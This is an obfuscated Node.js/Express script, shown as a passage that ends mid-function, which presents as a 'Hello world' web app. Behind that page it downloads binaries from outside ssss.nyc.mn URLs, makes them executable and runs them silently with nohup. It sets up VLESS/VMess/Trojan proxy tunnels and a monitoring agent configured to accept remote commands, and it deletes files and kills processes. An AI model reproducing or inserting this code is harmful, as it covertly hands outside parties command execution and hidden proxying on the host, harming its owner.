const _0x2ad559=_0x385a;(function(_0x1d3857,_0x512fbd){const _0xd8bed8={_0x4e758b:0x117,_0x3e5f3c:0x1be,_0x2c36e6:0x1ba,_0x37a741:0x17d},_0x262747=_0x385a,_0x68fa80=_0x1d3857();while(!![]){try{const _0x2db893=parseInt(_0x262747(_0xd8bed8._0x4e758b))/0x1*(-parseInt(_0x262747(_0xd8bed8._0x3e5f3c))/0x2)+parseInt(_0x262747(0x16d))/0x3+-parseInt(_0x262747(0x1ad))/0x4+-parseInt(_0x262747(_0xd8bed8._0x2c36e6))/0x5*(-parseInt(_0x262747(0x1cc))/0x6)+-parseInt(_0x262747(0x118))/0x7+-parseInt(_0x262747(_0xd8bed8._0x37a741))/0x8+-parseInt(_0x262747(0x1aa))/0x9*(-parseInt(_0x262747(0x15a))/0xa);if(_0x2db893===_0x512fbd)break;else _0x68fa80['push'](_0x68fa80['shift']());}catch(_0x58ca33){_0x68fa80['push'](_0x68fa80['shift']());}}}(_0x9b2c,0xb8b40));const express=require(_0x2ad559(0x199)),app=express(),axios=require(_0x2ad559(0x1c2)),os=require('os'),fs=require('fs'),path=require(_0x2ad559(0x1b1)),{promisify}=require(_0x2ad559(0x1b9)),exec=promisify(require(_0x2ad559(0x11b))[_0x2ad559(0x139)]),UPLOAD_URL=process['env'][_0x2ad559(0x12e)]||'',PROJECT_URL=process[_0x2ad559(0x1a8)][_0x2ad559(0x1d9)]||'',AUTO_ACCESS=process[_0x2ad559(0x1a8)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x2ad559(0x1a8)][_0x2ad559(0x19f)]||_0x2ad559(0x153),SUB_PATH=process[_0x2ad559(0x1a8)][_0x2ad559(0x181)]||_0x2ad559(0x146),PORT=process[_0x2ad559(0x1a8)][_0x2ad559(0x16b)]||process[_0x2ad559(0x1a8)][_0x2ad559(0x1bb)]||0xbb8,UUID=process[_0x2ad559(0x1a8)]['UUID']||'241e0354-76f1-46dc-87aa-f69cc52e8572',NEZHA_SERVER=process['env'][_0x2ad559(0x16f)]||'',NEZHA_PORT=process[_0x2ad559(0x1a8)][_0x2ad559(0x127)]||'',NEZHA_KEY=process[_0x2ad559(0x1a8)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x2ad559(0x1a8)][_0x2ad559(0x13f)]||'',ARGO_AUTH=process[_0x2ad559(0x1a8)][_0x2ad559(0x137)]||'',ARGO_PORT=process[_0x2ad559(0x1a8)][_0x2ad559(0x165)]||0x1f41,CFIP=process[_0x2ad559(0x1a8)]['CFIP']||_0x2ad559(0x192),CFPORT=process[_0x2ad559(0x1a8)]['CFPORT']||0x1bb,NAME=process[_0x2ad559(0x1a8)][_0x2ad559(0x133)]||'';!fs[_0x2ad559(0x174)](FILE_PATH)?(fs[_0x2ad559(0x14b)](FILE_PATH),console[_0x2ad559(0x1a0)](FILE_PATH+_0x2ad559(0x135))):console[_0x2ad559(0x1a0)](FILE_PATH+_0x2ad559(0x173));function generateRandomName(){const _0x54e4d5={_0x3ff41c:0x17c,_0xdbe289:0x15b,_0x52bf5d:0x18e,_0x58991f:0x140},_0x75461b=_0x2ad559,_0x56ecaf=_0x75461b(0x172);let _0x3be9c2='';for(let _0x24be09=0x0;_0x24be09<0x6;_0x24be09++){_0x3be9c2+=_0x56ecaf[_0x75461b(_0x54e4d5._0x3ff41c)](Math[_0x75461b(_0x54e4d5._0xdbe289)](Math[_0x75461b(_0x54e4d5._0x52bf5d)]()*_0x56ecaf[_0x75461b(_0x54e4d5._0x58991f)]));}return _0x3be9c2;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0x2ad559(0x12c)](FILE_PATH,phpName),webPath=path[_0x2ad559(0x12c)](FILE_PATH,webName),botPath=path[_0x2ad559(0x12c)](FILE_PATH,botName),subPath=path[_0x2ad559(0x12c)](FILE_PATH,'sub.txt'),listPath=path[_0x2ad559(0x12c)](FILE_PATH,_0x2ad559(0x1dc)),bootLogPath=path[_0x2ad559(0x12c)](FILE_PATH,_0x2ad559(0x186)),configPath=path['join'](FILE_PATH,_0x2ad559(0x10f));function deleteNodes(){const _0x4c9ab7={_0x13b6a9:0x16e,_0x7a3223:0x1d6,_0x3ea205:0x140,_0x17d125:0x113},_0x2f8bdf=_0x2ad559;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x13f371;try{_0x13f371=fs[_0x2f8bdf(0x114)](subPath,_0x2f8bdf(0x1ce));}catch{return null;}const _0x556bb3=Buffer[_0x2f8bdf(0x157)](_0x13f371,_0x2f8bdf(0x1b0))[_0x2f8bdf(0x124)](_0x2f8bdf(0x1ce)),_0x4b3052=_0x556bb3[_0x2f8bdf(_0x4c9ab7._0x13b6a9)]('\x0a')[_0x2f8bdf(_0x4c9ab7._0x7a3223)](_0xfb7eb1=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x2f8bdf(0x167)](_0xfb7eb1));if(_0x4b3052[_0x2f8bdf(_0x4c9ab7._0x3ea205)]===0x0)return;return axios['post'](UPLOAD_URL+'/api/delete-nodes',JSON[_0x2f8bdf(_0x4c9ab7._0x17d125)]({'nodes':_0x4b3052}),{'headers':{'Content-Type':_0x2f8bdf(0x121)}})['catch'](_0x3e9955=>{return null;}),null;}catch(_0x20b299){return null;}}function cleanupOldFiles(){const _0x2e1a54={_0xc93d60:0x155,_0x57f8bb:0x175},_0x4c4ff6=_0x2ad559;try{const _0x5cd615=fs[_0x4c4ff6(0x1c5)](FILE_PATH);_0x5cd615['forEach'](_0x1612f4=>{const _0xc9bd5=_0x4c4ff6,_0x22a732=path[_0xc9bd5(0x12c)](FILE_PATH,_0x1612f4);try{const _0x4fc73d=fs[_0xc9bd5(_0x2e1a54._0xc93d60)](_0x22a732);_0x4fc73d[_0xc9bd5(_0x2e1a54._0x57f8bb)]()&&fs[_0xc9bd5(0x13e)](_0x22a732);}catch(_0x211331){}});}catch(_0x2b8819){}}async function generateConfig(){const _0x5fefb5={_0x2bd17e:0x1da,_0xf8aa91:0x130,_0x1da810:0x161,_0xd6a869:0x1a7,_0x4b844e:0x130,_0xe55359:0x17e,_0x4cb9b2:0x1a9,_0x245a4d:0x178,_0x36cdca:0x11c,_0x3f3ae7:0x111,_0x230588:0x12c,_0x4bd7f7:0x10f},_0xb48feb=_0x2ad559,_0x265583={'log':{'access':_0xb48feb(_0x5fefb5._0x2bd17e),'error':_0xb48feb(0x1da),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0xb48feb(0x1d5),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0xb48feb(_0x5fefb5._0xf8aa91),'fallbacks':[{'dest':0xbb9},{'path':_0xb48feb(_0x5fefb5._0x1da810),'dest':0xbba},{'path':_0xb48feb(0x17e),'dest':0xbbb},{'path':_0xb48feb(0x17a),'dest':0xbbc}]},'streamSettings':{'network':_0xb48feb(_0x5fefb5._0xd6a869)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0xb48feb(0x1d5),'settings':{'clients':[{'id':UUID}],'decryption':_0xb48feb(_0x5fefb5._0x4b844e)},'streamSettings':{'network':_0xb48feb(0x1a7),'security':'none'}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0xb48feb(0x1d5),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0xb48feb(_0x5fefb5._0xf8aa91),'wsSettings':{'path':_0xb48feb(_0x5fefb5._0x1da810)}},'sniffing':{'enabled':!![],'destOverride':[_0xb48feb(0x1a9),_0xb48feb(0x1d1),_0xb48feb(0x178)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0xb48feb(0x158),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0xb48feb(_0x5fefb5._0xe55359)}},'sniffing':{'enabled':!![],'destOverride':[_0xb48feb(_0x5fefb5._0x4cb9b2),'tls','quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0xb48feb(_0x5fefb5._0x4b844e),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0xb48feb(_0x5fefb5._0x4cb9b2),'tls',_0xb48feb(_0x5fefb5._0x245a4d)],'metadataOnly':![]}}],'dns':{'servers':[_0xb48feb(_0x5fefb5._0x36cdca)]},'outbounds':[{'protocol':_0xb48feb(0x197),'tag':_0xb48feb(0x12d)},{'protocol':_0xb48feb(0x179),'tag':_0xb48feb(_0x5fefb5._0x3f3ae7)}]};fs['writeFileSync'](path[_0xb48feb(_0x5fefb5._0x230588)](FILE_PATH,_0xb48feb(_0x5fefb5._0x4bd7f7)),JSON[_0xb48feb(0x113)](_0x265583,null,0x2));}function getSystemArchitecture(){const _0x381726={_0x48d1e9:0x1ca,_0x5769b5:0x1b7,_0x5d674b:0x1dd},_0x1463ec=_0x2ad559,_0x5056cb=os[_0x1463ec(0x154)]();return _0x5056cb==='arm'||_0x5056cb===_0x1463ec(_0x381726._0x48d1e9)||_0x5056cb===_0x1463ec(0x143)?_0x1463ec(_0x381726._0x5769b5):_0x1463ec(_0x381726._0x5d674b);}function downloadFile(_0x33e0c1,_0x5d280f,_0x493a5b){const _0x46c076={_0x935c87:0x16c,_0x1b9965:0x144,_0x1dddcd:0x125},_0x38141c={_0x3b2fcf:0x17f,_0x1debe3:0x148},_0x551aff={_0x9ebfde:0x1a3,_0x3e38f4:0x148},_0x2c4cb9={_0x45beda:0x120,_0x42c469:0x116,_0x4d4c6e:0x170,_0x3dd1eb:0x148},_0x5823b4=_0x2ad559,_0x59a69b=_0x33e0c1;!fs[_0x5823b4(0x174)](FILE_PATH)&&fs[_0x5823b4(0x14b)](FILE_PATH,{'recursive':!![]});const _0x28a162=fs[_0x5823b4(_0x46c076._0x935c87)](_0x59a69b);axios({'method':_0x5823b4(_0x46c076._0x1b9965),'url':_0x5d280f,'responseType':'stream'})[_0x5823b4(0x15f)](_0x1eff59=>{const _0x4c9dbf={_0x363d0c:0x120},_0x517a9c=_0x5823b4;_0x1eff59[_0x517a9c(0x18f)][_0x517a9c(0x1c3)](_0x28a162),_0x28a162['on'](_0x517a9c(_0x551aff._0x9ebfde),()=>{const _0x48b112=_0x517a9c;_0x28a162['close'](),console[_0x48b112(0x1a0)](_0x48b112(_0x4c9dbf._0x363d0c)+path['basename'](_0x59a69b)+_0x48b112(0x14a)),_0x493a5b(null,_0x59a69b);}),_0x28a162['on'](_0x517a9c(_0x551aff._0x3e38f4),_0x334845=>{const _0x494dec=_0x517a9c;fs['unlink'](_0x59a69b,()=>{});const _0x423c19=_0x494dec(_0x2c4cb9._0x45beda)+path[_0x494dec(_0x2c4cb9._0x42c469)](_0x59a69b)+'\x20failed:\x20'+_0x334845[_0x494dec(_0x2c4cb9._0x4d4c6e)];console[_0x494dec(_0x2c4cb9._0x3dd1eb)](_0x423c19),_0x493a5b(_0x423c19);});})[_0x5823b4(_0x46c076._0x1dddcd)](_0x14d73c=>{const _0x4fa36a=_0x5823b4,_0x57ce7d=_0x4fa36a(0x120)+path['basename'](_0x59a69b)+_0x4fa36a(_0x38141c._0x3b2fcf)+_0x14d73c['message'];console[_0x4fa36a(_0x38141c._0x1debe3)](_0x57ce7d),_0x493a5b(_0x57ce7d);});}async function downloadFilesAndRun(){const _0x5f5173={_0x3f5947:0x140,_0x196798:0x171,_0x310eec:0x148,_0x5b3fea:0x168,_0x5a5182:0x18d,_0x5e85ac:0x1d4,_0x563c57:0x128,_0x10e849:0x123,_0x54a707:0x162,_0x23c745:0x15e,_0x276b54:0x142,_0x36b438:0x1a0,_0x2ac176:0x1a4,_0x5377f1:0x18d,_0x262558:0x1d4,_0x1bb10a:0x131,_0x582145:0x1c1,_0x330f34:0x166,_0x27e6d0:0x182,_0x185d26:0x174,_0x3c6684:0x195,_0x4cf2ed:0x195,_0x4c89fd:0x14d,_0x47dce2:0x14e,_0x4effe1:0x160,_0x553d28:0x1b4},_0x74c203=_0x2ad559,_0x4f9774=getSystemArchitecture(),_0x5a5863=getFilesForArchitecture(_0x4f9774);if(_0x5a5863[_0x74c203(_0x5f5173._0x3f5947)]===0x0){console['log'](_0x74c203(0x1c4));return;}const _0x41a255=_0x5a5863[_0x74c203(0x177)](_0x556e82=>{const _0x33c473={_0x5d5420:0x18a,_0x5842b8:0x1bd};return new Promise((_0x52e3f4,_0xd7b113)=>{const _0x374d4b=_0x385a;downloadFile(_0x556e82[_0x374d4b(_0x33c473._0x5d5420)],_0x556e82[_0x374d4b(_0x33c473._0x5842b8)],(_0x3e1466,_0x2475d6)=>{_0x3e1466?_0xd7b113(_0x3e1466):_0x52e3f4(_0x2475d6);});});});try{await Promise[_0x74c203(_0x5f5173._0x196798)](_0x41a255);}catch(_0x4f5566){console[_0x74c203(_0x5f5173._0x310eec)](_0x74c203(0x129),_0x4f5566);return;}function _0x34ad3a(_0x1a13ed){const _0x266c69=_0x74c203,_0x39cedf=0x1fd;_0x1a13ed[_0x266c69(0x11f)](_0x41b9a3=>{const _0x4d0267={_0x21dcdb:0x1a0,_0x59cad9:0x124},_0x4eece4=_0x266c69;fs['existsSync'](_0x41b9a3)&&fs[_0x4eece4(0x159)](_0x41b9a3,_0x39cedf,_0x34abff=>{const _0x1774d5=_0x4eece4;_0x34abff?console['error']('Empowerment\x20failed\x20for\x20'+_0x41b9a3+':\x20'+_0x34abff):console[_0x1774d5(_0x4d0267._0x21dcdb)]('Empowerment\x20success\x20for\x20'+_0x41b9a3+':\x20'+_0x39cedf[_0x1774d5(_0x4d0267._0x59cad9)](0x8));});});}const _0x36ded0=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x34ad3a(_0x36ded0);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x376f4a=NEZHA_SERVER[_0x74c203(_0x5f5173._0x5b3fea)](':')?NEZHA_SERVER[_0x74c203(0x16e)](':')[_0x74c203(0x13d)]():'',_0xd6bd52=new Set([_0x74c203(0x1a4),'8443',_0x74c203(0x1de),_0x74c203(_0x5f5173._0x5a5182),_0x74c203(_0x5f5173._0x5e85ac),'2053']),_0x1b9602=_0xd6bd52['has'](_0x376f4a)?_0x74c203(0x191):_0x74c203(_0x5f5173._0x563c57),_0x5be98e=_0x74c203(_0x5f5173._0x10e849)+NEZHA_KEY+_0x74c203(0x11d)+NEZHA_SERVER+_0x74c203(_0x5f5173._0x54a707)+_0x1b9602+_0x74c203(_0x5f5173._0x23c745)+UUID;fs['writeFileSync'](path[_0x74c203(0x12c)](FILE_PATH,_0x74c203(_0x5f5173._0x276b54)),_0x5be98e);const _0x300b9c=_0x74c203(0x18c)+phpPath+_0x74c203(0x1cd)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x300b9c),console[_0x74c203(_0x5f5173._0x36b438)](phpName+'\x20is\x20running'),await new Promise(_0x438468=>setTimeout(_0x438468,0x3e8));}catch(_0x2d2b52){console[_0x74c203(0x148)](_0x74c203(0x13c)+_0x2d2b52);}}else{let _0x4abd78='';const _0x44e6dc=[_0x74c203(_0x5f5173._0x2ac176),'8443','2096',_0x74c203(_0x5f5173._0x5377f1),_0x74c203(_0x5f5173._0x262558),'2053'];_0x44e6dc[_0x74c203(0x168)](NEZHA_PORT)&&(_0x4abd78=_0x74c203(0x187));const _0x20a6e0='nohup\x20'+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x74c203(0x141)+NEZHA_KEY+'\x20'+_0x4abd78+_0x74c203(_0x5f5173._0x1bb10a);try{await exec(_0x20a6e0),console['log'](npmName+'\x20is\x20running'),await new Promise(_0x2813e6=>setTimeout(_0x2813e6,0x3e8));}catch(_0x4deb8d){console[_0x74c203(_0x5f5173._0x310eec)](_0x74c203(_0x5f5173._0x582145)+_0x4deb8d);}}}else console[_0x74c203(_0x5f5173._0x36b438)](_0x74c203(_0x5f5173._0x330f34));const _0x24c5ff='nohup\x20'+webPath+_0x74c203(0x185)+FILE_PATH+_0x74c203(0x189);try{await exec(_0x24c5ff),console['log'](webName+_0x74c203(0x1d3)),await new Promise(_0x4572ba=>setTimeout(_0x4572ba,0x3e8));}catch(_0x135455){console['error'](_0x74c203(_0x5f5173._0x27e6d0)+_0x135455);}if(fs[_0x74c203(_0x5f5173._0x185d26)](botPath)){let _0x57b160;if(ARGO_AUTH[_0x74c203(_0x5f5173._0x3c6684)](/^[A-Z0-9a-z=]{120,250}$/))_0x57b160=_0x74c203(0x12b)+ARGO_AUTH;else ARGO_AUTH[_0x74c203(_0x5f5173._0x4cf2ed)](/TunnelSecret/)?_0x57b160=_0x74c203(0x1d7)+FILE_PATH+_0x74c203(_0x5f5173._0x4c89fd):_0x57b160=_0x74c203(_0x5f5173._0x47dce2)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x74c203(0x18c)+botPath+'\x20'+_0x57b160+_0x74c203(_0x5f5173._0x4effe1)),console[_0x74c203(0x1a0)](botName+_0x74c203(0x1d3)),await new Promise(_0x22e6e4=>setTimeout(_0x22e6e4,0x7d0));}catch(_0x93ea40){console[_0x74c203(0x148)](_0x74c203(_0x5f5173._0x553d28)+_0x93ea40);}}await new Promise(_0x209b28=>setTimeout(_0x209b28,0x1388));}function _0x385a(_0x27ada7,_0x25a21a){const _0x9b2c55=_0x9b2c();return _0x385a=function(_0x385a6b,_0x230ed2){_0x385a6b=_0x385a6b-0x10f;let _0xa1e91f=_0x9b2c55[_0x385a6b];return _0xa1e91f;},_0x385a(_0x27ada7,_0x25a21a);}function _0x9b2c(){const _0x33316e=['list.txt','amd','2096','config.json','Add\x20automatic\x20access\x20task\x20faild:\x20','block','index.html','stringify','readFileSync','\x0a\x20\x20credentials-file:\x20','basename','1XNgudL','8136702LfFpCw','push','/sub.txt\x20saved\x20successfully','child_process','https+local://8.8.8.8/dns-query','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','https://amd64.ssss.nyc.mn/bot','forEach','Download\x20','application/json','https://amd64.ssss.nyc.mn/agent','\x0aclient_secret:\x20','toString','catch','\x20>\x20nul\x202>&1','NEZHA_PORT','false','Error\x20downloading\x20files:','clear','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','join','direct','UPLOAD_URL','post','none','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','Nodes\x20uploaded\x20successfully','NAME','Mozilla/5.0','\x20is\x20created','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','ARGO_AUTH','ARGO_DOMAIN:','exec','automatic\x20access\x20task\x20added\x20successfully','win32','php\x20running\x20error:\x20','pop','unlinkSync','ARGO_DOMAIN','length','\x20-p\x20','config.yaml','aarch64','get','TunnelSecret','sub','\x0a\x20\x20\x20\x20','error','promises','\x20successfully','mkdirSync','Content-Type','/tunnel.yml\x20run','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','utf8','success','org','&path=%2Fvless-argo%3Fed%3D2560#','.tmp','arch','statSync','\x0a\x0avmess://','from','127.0.0.1','chmod','10BmeDIn','floor','listen','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','then','\x20>/dev/null\x202>&1\x20&','/vless-argo','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','Unhandled\x20error\x20in\x20startserver:','unshift','ARGO_PORT','NEZHA\x20variable\x20is\x20empty,skip\x20running','test','includes','country_code','text/plain;\x20charset=utf-8','SERVER_PORT','createWriteStream','1394523OfdKjK','split','NEZHA_SERVER','message','all','abcdefghijklmnopqrstuvwxyz','\x20already\x20exists','existsSync','isFile','status','map','quic','blackhole','/trojan-argo','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','charAt','2675752ZiunmE','/vmess-argo','\x20failed:\x20','set','SUB_PATH','web\x20running\x20error:\x20','auto','firefox','\x20-c\x20','boot.log','--tls','\x0a\x0atrojan://','/config.json\x20>/dev/null\x202>&1\x20&','fileName','isp','nohup\x20','2087','random','data','\x0avless://','true','saas.sin.fan','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','https://arm64.ssss.nyc.mn/bot','match','\x22\x20>\x20/dev/null\x202>&1','freedom','/vmess-argo?ed=2560','express','https://amd64.ssss.nyc.mn/v1','Unknown','App\x20is\x20running','https://arm64.ssss.nyc.mn/v1','&fp=firefox&type=ws&host=','FILE_PATH','log','http://ip-api.com/json','replace','finish','443','https://amd64.ssss.nyc.mn/web','send','tcp','env','http','17976951NjwhDT','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','Hello\x20world!<br><br>You\x20can\x20access\x20/{SUB_PATH}(Default:\x20/sub)\x20to\x20get\x20your\x20nodes!','3559712usBBiB','\x20>/dev/null\x202>&1','Skipping\x20adding\x20automatic\x20access\x20task','base64','path','/api/add-subscriptions','&path=%2Ftrojan-argo%3Fed%3D2560#','Error\x20executing\x20command:\x20','https://api.ip.sb/geoip','https://oooo.serv00.net/add-url','arm','Subscription\x20uploaded\x20successfully','util','150DSUVQG','PORT','platform','fileUrl','1407866pXkDvk','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','/api/add-nodes','npm\x20running\x20error:\x20','axios','pipe','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','readdirSync','del\x20/f\x20/q\x20','?security=tls&sni=','Error\x20reading\x20boot.log:','rm\x20-rf\x20','arm64','https://arm64.ssss.nyc.mn/agent','276996ikRdJq','\x20-c\x20\x22','utf-8','writeFileSync','Error\x20in\x20startserver:','tls','response','\x20is\x20running','2083','vless','filter','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','tunnel.json','PROJECT_URL','/dev/null','.exe\x20>\x20nul\x202>&1'];_0x9b2c=function(){return _0x33316e;};return _0x9b2c();}function getFilesForArchitecture(_0x3037d9){const _0x338b2a={_0x20de43:0x194,_0x5147ce:0x1a5,_0x4cda4f:0x1cb,_0x51e6e7:0x19a},_0x31620d=_0x2ad559;let _0x2f1ea6;_0x3037d9==='arm'?_0x2f1ea6=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x31620d(_0x338b2a._0x20de43)}]:_0x2f1ea6=[{'fileName':webPath,'fileUrl':_0x31620d(_0x338b2a._0x5147ce)},{'fileName':botPath,'fileUrl':_0x31620d(0x11e)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x2ec169=_0x3037d9===_0x31620d(0x1b7)?_0x31620d(_0x338b2a._0x4cda4f):_0x31620d(0x122);_0x2f1ea6[_0x31620d(0x164)]({'fileName':npmPath,'fileUrl':_0x2ec169});}else{const _0x495a97=_0x3037d9===_0x31620d(0x1b7)?_0x31620d(0x19d):_0x31620d(_0x338b2a._0x51e6e7);_0x2f1ea6['unshift']({'fileName':phpPath,'fileUrl':_0x495a97});}}return _0x2f1ea6;}function argoType(){const _0x1ebffe={_0x1f24c3:0x12c,_0x81ac95:0x115,_0x3d3c24:0x12c,_0x50ac08:0x1d8,_0x281919:0x12c,_0x5a7b80:0x1a0},_0x805340=_0x2ad559;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x805340(0x1a0)](_0x805340(0x1bf));return;}if(ARGO_AUTH['includes'](_0x805340(0x145))){fs[_0x805340(0x1cf)](path[_0x805340(_0x1ebffe._0x1f24c3)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x52d28b='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x805340(0x16e)]('\x22')[0xb]+_0x805340(_0x1ebffe._0x81ac95)+path[_0x805340(_0x1ebffe._0x3d3c24)](FILE_PATH,_0x805340(_0x1ebffe._0x50ac08))+_0x805340(0x193)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs['writeFileSync'](path[_0x805340(_0x1ebffe._0x281919)](FILE_PATH,'tunnel.yml'),_0x52d28b);}else console[_0x805340(_0x1ebffe._0x5a7b80)](_0x805340(0x15d));}async function extractDomains(){const _0x54c578={_0x596b84:0x1a0,_0x579688:0x114,_0x2c3242:0x1ce,_0x4bd082:0x140,_0x3c99c7:0x1a0,_0x518ed6:0x1a0,_0xe6145f:0x17b,_0x42d165:0x186,_0x19173c:0x18c,_0x5eba43:0x160},_0x2b7452={_0x2b1718:0x1b5,_0x142d49:0x134,_0xbf7e3a:0x18f,_0x3f6b74:0x18b,_0x53709c:0x1a2,_0x2d1a5a:0x144,_0x24a726:0x1a1,_0x26237d:0x134,_0x40ae69:0x18f,_0x330179:0x18f},_0x1774f7={_0x5b1021:0x1bc},_0x13083c=_0x2ad559;let _0x73055c;if(ARGO_AUTH&&ARGO_DOMAIN)_0x73055c=ARGO_DOMAIN,console[_0x13083c(_0x54c578._0x596b84)](_0x13083c(0x138),_0x73055c),await _0x46e3f7(_0x73055c);else try{const _0x2c5e3d=fs[_0x13083c(_0x54c578._0x579688)](path['join'](FILE_PATH,_0x13083c(0x186)),_0x13083c(_0x54c578._0x2c3242)),_0x3db7b5=_0x2c5e3d[_0x13083c(0x16e)]('\x0a'),_0x3a7566=[];_0x3db7b5['forEach'](_0x29d560=>{const _0x58733c=_0x13083c,_0x13299d=_0x29d560['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x13299d){const _0xe93a0e=_0x13299d[0x1];_0x3a7566[_0x58733c(0x119)](_0xe93a0e);}});if(_0x3a7566[_0x13083c(_0x54c578._0x4bd082)]>0x0)_0x73055c=_0x3a7566[0x0],console[_0x13083c(_0x54c578._0x3c99c7)]('ArgoDomain:',_0x73055c),await _0x46e3f7(_0x73055c);else{console[_0x13083c(_0x54c578._0x518ed6)](_0x13083c(_0x54c578._0xe6145f)),fs[_0x13083c(0x13e)](path['join'](FILE_PATH,_0x13083c(_0x54c578._0x42d165)));async function _0x267934(){const _0x269d5b=_0x13083c;try{process[_0x269d5b(_0x1774f7._0x5b1021)]===_0x269d5b(0x13b)?await exec('taskkill\x20/f\x20/im\x20'+botName+_0x269d5b(0x1db)):await exec('pkill\x20-f\x20\x22['+botName[_0x269d5b(0x17c)](0x0)+']'+botName['substring'](0x1)+_0x269d5b(0x196));}catch(_0x34270f){}}_0x267934(),await new Promise(_0x4773b9=>setTimeout(_0x4773b9,0xbb8));const _0xa77590=_0x13083c(0x14e)+FILE_PATH+_0x13083c(0x136)+ARGO_PORT;try{await exec(_0x13083c(_0x54c578._0x19173c)+botPath+'\x20'+_0xa77590+_0x13083c(_0x54c578._0x5eba43)),console[_0x13083c(0x1a0)](botName+'\x20is\x20running'),await new Promise(_0x3685de=>setTimeout(_0x3685de,0xbb8)),await extractDomains();}catch(_0x16e13a){console[_0x13083c(0x148)](_0x13083c(0x1b4)+_0x16e13a);}}}catch(_0x4b712b){console[_0x13083c(0x148)](_0x13083c(0x1c8),_0x4b712b);}async function _0x1795d0(){const _0xf4a0b8=_0x13083c;try{const _0x15bef0=await axios[_0xf4a0b8(0x144)](_0xf4a0b8(_0x2b7452._0x2b1718),{'headers':{'User-Agent':_0xf4a0b8(_0x2b7452._0x142d49),'timeout':0xbb8}});if(_0x15bef0[_0xf4a0b8(0x18f)]&&_0x15bef0[_0xf4a0b8(_0x2b7452._0xbf7e3a)][_0xf4a0b8(0x169)]&&_0x15bef0['data']['isp'])return(_0x15bef0[_0xf4a0b8(0x18f)][_0xf4a0b8(0x169)]+'-'+_0x15bef0['data'][_0xf4a0b8(_0x2b7452._0x3f6b74)])[_0xf4a0b8(_0x2b7452._0x53709c)](/\s+/g,'_');}catch(_0x454d9a){try{const _0x254d86=await axios[_0xf4a0b8(_0x2b7452._0x2d1a5a)](_0xf4a0b8(_0x2b7452._0x24a726),{'headers':{'User-Agent':_0xf4a0b8(_0x2b7452._0x26237d),'timeout':0xbb8}});if(_0x254d86[_0xf4a0b8(_0x2b7452._0xbf7e3a)]&&_0x254d86[_0xf4a0b8(0x18f)]['status']===_0xf4a0b8(0x150)&&_0x254d86[_0xf4a0b8(_0x2b7452._0x40ae69)]['countryCode']&&_0x254d86['data'][_0xf4a0b8(0x151)])return(_0x254d86[_0xf4a0b8(_0x2b7452._0x330179)]['countryCode']+'-'+_0x254d86['data']['org'])[_0xf4a0b8(0x1a2)](/\s+/g,'_');}catch(_0x440e61){}}return _0xf4a0b8(0x19b);}async function _0x46e3f7(_0x50336a){const 